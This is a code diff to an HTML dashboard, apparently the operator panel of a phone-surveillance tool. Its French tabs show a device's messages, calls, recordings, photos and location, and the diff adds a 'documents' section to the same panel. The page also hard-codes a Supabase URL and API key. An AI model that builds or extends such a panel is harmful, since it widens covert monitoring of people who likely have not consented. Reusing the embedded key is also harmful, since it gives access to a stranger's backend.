@@ -104,6 +104,11 @@ audio { width:100%; margin-top:8px; }
   <div class="photo-grid" id="list-photos"></div>
 </div>
 
+<div class="section" id="sec-documents" style="display:none">
+  <div class="section-title">📄 DOCUMENTS</div>
+  <div id="list-documents" style="padding:8px"></div>
+</div>
+
 <script>
 const URL = "https://wcgfvjunixmlojptkclp.supabase.co";
 const KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndjZ2Z2anVuaXhtbG9qcHRrY2xwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTAwMDk4MTAsImV4cCI6MjEwNTU4NTgxMH0.0YredbrRG773Ug7V5h0IcCjkFBRXMZ__InZ0e1VrS5U";
@@ -187,7 +192,8 @@ async function chargerPhotos() {
 
 function showTab(tab) {
   if(tab==="localisation") chargerLocalisation();
-  ["messages","appels","enregistrements","photos","localisation"].forEach(t=>{
+  if(tab==="documents") chargerDocuments();
+  ["messages","appels","enregistrements","photos","localisation","documents"].forEach(t=>{
     document.getElementById("sec-"+t).style.display = t===tab?"block":"none";
     const el = document.getElementById("tab-"+t);
     if(el) el.className = "tab"+(t===tab?" active":"");
